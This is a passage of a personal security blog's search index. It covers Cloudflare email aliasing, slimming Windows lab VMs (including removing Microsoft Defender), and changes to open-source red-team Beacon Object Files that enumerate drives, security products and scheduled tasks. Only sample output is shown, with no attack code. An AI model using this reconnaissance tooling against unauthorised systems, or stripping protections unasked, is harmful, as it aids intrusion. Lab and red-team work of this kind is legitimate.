forward emails sent to a domain you own to any email address of your choosing.\nThis feature is free meaning you only have to own a domain to be able to set this. Cloudflare provides an easy to use solution with just a few clicks.","opsec-privacy-and-notes-of-caution#OPSEC, Privacy and notes of caution":" Cloudflare is a one stop shop which centralises a lot of internet traffic. The email are routed through their servers which could technically log all of them for whatever reason… You should make your own decision whether to trust them with your emails. For important accounts, I would recommend using your email address directly instead of an alias, unless you need it as part of your OPSEC/Threat Model. While I check and I don’t think it’s possible to use the MX DNS records to identify if two Cloudflare domains are connected (ie. like for NS records on Cloudflare domains), there may be various attacks I am unaware off. Do your own research. If you plan on using an email client like Thunderbird, you’ll need to have access to SMTP ports which depending on the email provider might be a paid feature (eg. protonmail) or protected by account verification. This is done by providers to reduce spam and phishing emails being sent from their services. ","sending-emails#Sending emails":"Sending emails used to be possible, however Cloudflare discontinued their mailchannels partnership (I’m assuming it was abused a ton..) which means you can no longer send emails. They only allow you to send emails to address you own / have access to (second step phishing maybe? 🤔) and require you to verify you own the address (ie. email verification via email link).\nSee the following references for more details:\nhttps://developers.cloudflare.com/email-routing/email-workers/send-email-workers/ https://www.mailchannels.com/email-api/ https://github.com/Sh4yy/cloudflare-email https://github.com/Sh4yy/cloudflare-email/issues/16 https://github.com/Sh4yy/cloudflare-email/issues/19 ","setting-up-the-redirection#Setting up the redirection":" Important\nBefore you start looking into this, remember that the ability to send email via Cloudflare email aliasing no longer works. You’d have to find another solution if you need to send email addresses or use your email directly.\nWhat you’ll need:\nan email provider (eg. gmail, protonmail, microsoft, etc..) - Anything will be supported as it’s only used to receive email addresses. Choose whichever solution fits your needs. a Cloudflare hosted domain you own and on which you can setup MX records to point to Cloudflare mail servers 5 minutes of your time Start by selecting the Cloudflare domain you want to setup for email routing from your Cloudflare dashboard. You’ll then need to select Email \u003e Email Routing from the left navbar, which should bring you to a page similar to this:\nFrom here, you’ll need to verify your destination address and setup the MX records which should only be a few clicks from the dashboard. Just follow the instructions. Once done, you can setup your routing rules and you can set a catch-all email address from here:\nYou can also create custom addresses and redirect those to another destination if you wish. (or play around with Cloudflare workers for additional functionality):\nIf done correctly, you can start using your email address to register accounts from any spammy website. For example, I needed access to Alltrails some time ago so I created an account on Alltrails with the email address alltrails@domain2.com which I now receive all Alltrails spam emails to:\nLooking at the email source, we can see it routed via Cloudflare properly:\nNote\nEmail providers may consider these routed emails as spam emails (if you are using a spammy looking email address). eg. I own a domain which contains the name of a know email provider in it and that almost always ends up being considered spam. This might be a good thing if you want to signup with this domain to only spammy websites that you dont need to keep emails for (ie. autodeletes after 30 days) but might not be desirable for other websites."},"title":"Create Infinite Email aliases using Cloudflare Email Routing"},"/minis/creating-lightweight-windows-virtual-machines-for-your-personal-lab-environment/":{"data":{"":"Windows VMs are great… Until they hog half of your laptop’s resources, take up at least 40GB of storage and are basically unusable whenever an app requires the slightest amount of computing power.\nI had that issue for a very long time until I came across this unbelievable tweet of Windows 11 running on 184MB of RAM:\nhttps://x.com/NTDEV_/status/1876434066364383507 Any human successfully running Windows 11 on a 2009 iPod Touch amount of RAM is a legend in my books. I had to look into this in-human person who was going to be my spirit animal for the day…\nAs it turns out, this is not NTDEV’s first rodeo… This man eats RAM for breakfast! Looking through his previous tweets and reading his blog, I’ve realised he has released a number of tiny Windows ISOs for Windows 10 and Windows 11. These tiny ISOs are lightweight, stripped-down versions of their respective counterparts. I thought surely, they can’t be that much better than the official Windows 10 ISO.\nSo I tried them… Furiously deleted on a few more resources and boy was I blown away by the final resource consumption reduction!","comparing-an-unmodified-windows-vm-with-my-custom-lightweight-vm#Comparing an unmodified Windows VM with my custom Lightweight VM":"The following screenshots were made under the following conditions in an attempt to provide a fair comparaison:\nVMs were given the exact same resources Both were under zero load (ie. at rest, no user application running) when the screenshots were taken VM Screen Display settings were set to the same Display resolution Task Manager Performance Windows 10 Task Manager Performance Lightweight VM Windows 10 CPU at rest example 1 Windows 10 CPU at rest example 2 Lightweight VM CPU at rest Drive Space Windows 10 Drive Space Tiny10 While comparing the two VMs, the following things were noted:\nThe original Windows 10 VM was using around 1.5 times the Memory (RAM) of the Lightweight VM. The CPU on the Windows 10 VM was a lot more sporadic, with numerous spikes even when no user application is running, while the Lightweight VM hovered around 1 to 2 % CPU utilisation. The Windows 10 VM was around 27.3 GBs while the Lightweight VM required a maximum of 10.3 GBs to install The initial ISO’s used had a 2.2GB size discrepancy, with the smallest being the tiny10 ISO: 3.6G 'tiny10 x64 23h2.iso' 5.8G Win10_22H2_EnglishInternational_x64v1.iso Further improvements are potentially possible, however you should be cautious as the more things you remove, the more likely you are to have issues, missing features and render the VM unusable.","conclusion#Conclusion":"Overall, there is a significant amount of bloat on full Windows 10 ISOs which can be improved provided you don’t need the features that are being removed. This results in tiny ISOs with amazing benefits:\nLower RAM and CPU usage Smaller disk footprint Faster boot and responsiveness These can be great for lower end devices, when you need to run a lot of VMs in parallel for examples for an Active Directory Lab Environment, to save battery/energy on a device, and more…","creating-a-lightweight-windows-10-vm#Creating a Lightweight Windows 10 VM":"First, I download the tiny10 ISO from archive.org: https://archive.org/download/tiny-10-23-h2/tiny10%20x64%2023h2.iso. You can speed up this process using aria2c to download the file with multiple server connections.\nI then installed it on my Virtualisation software of choice, namely QEMU.\nI booted it and decided to remove Microsoft Defender because I didn’t need it for the VM’s use case which reduced the RAM consumption a lot. I personally used the following tool which worked at the time. As these are patched by Microsoft every so often, YMMV.\nI also tried the following “Debloater”, not sure if it actually did anything… Seems like most of it was already taken care of by NTDEV’s Tiny ISO.\nFrom looking at task manager and assessing the resource consumption of different processes, this felt like a good first pass where I eliminated the most consuming resources and attempting to go any further would take unreasonable amount of time for little benefit (Pareto principle).\nSo that was pretty much it for optimisation…","further-research#Further Research":"There are definitely more things you can delete but you risk running into issues. Resource Monitor might be a great place to start:\nOther tools to consider for identifying processes hogging resources:\nhttps://systeminformer.com/ https://learn.microsoft.com/en-us/sysinternals/downloads/procmon If you’re interested in making your own tiny ISO’s, you should look at ntdev’s GitHub repo tiny11builder which has all the tools for building a tiny Windows 11 ISO. There are also a number of GitHub forks to create tiny Windows 10 ISOs too… Do your own research.","references#References":" https://x.com/NTDEV_ https://ntdev.blog/2024/01/08/the-complete-tiny10-and-tiny11-list/ https://archive.org/details/@ntdev https://answers.microsoft.com/en-us/windows/forum/all/how-to-reduce-ram-consumption-in-windows-10/cb42a95f-8fe8-47dc-9721-d31e5379b826 https://ntdev.blog/2023/12/10/how-to-build-your-own-tiny11-the-definitive-guide-on-how-to-create-the-perfect-lightweight-windows-image/ https://techcommunity.microsoft.com/discussions/windows11/how-to-open-resource-monitor-using-task-manager-on-windows-11/3333480 "},"title":"Creating Lightweight Windows Virtual Machines for your Personal Lab Environment"},"/minis/improving-functionality-of-open-source-bofs/":{"data":{"":"","#":"OperatorsKit https://github.com/fyxme/OperatorsKit Original source: https://github.com/REDMED-X/OperatorsKit/\nEnumDrives BOF NETWORK drives will now find and print the mapped network share add Makefile for compiling on linux via mingw Before: DRIVE TYPE ========================================== C:\\ [Fixed drive] N:\\ [Network drive] After: DRIVE TYPE ========================================== C:\\ [Fixed drive] N:\\ [Network drive] \\\\web01.fyxme.local\\webserver\\www EnumSecProducts BOF expanded software list from 130 to 150 security tools added improved output with pid and procname for identified security tools add Makefile for compiling on linux via mingw The BOF has been modified to include the process id (pid) and the filename of the security process it flagged.\nBefore: Description Category ============================================================== Windows Defender AV Microsoft Security Essentials AV After: Category Pid Filename Description ============================================================== AV 1688 msmpeng.exe Windows Defender AV 3240 nissrv.exe Microsoft Security Essentials EnumTaskScheduler BOF Find and print command arguments for each scheduled task that runs an executable add Makefile for compiling on linux via mingw Before: [+] Scheduled tasks in root folder: ======================================================= Task Name: Daily Reboot - Task running as: ahomer - Action type: Start a program - Executable path: C:\\Windows\\System32\\cmd.exe - Trigger type: Daily ---------------------------------------------------- After: [+] Scheduled tasks in root folder: ======================================================= Task Name: Daily Reboot - Task running as: ahomer - Action type: Start a program - Executable path: C:\\Windows\\System32\\cmd.exe - Command Arguments: /c \"shutdown /r /t 0\" - Trigger type: Daily ---------------------------------------------------- "},"title":"Improving functionality of Open Source BOFs"}}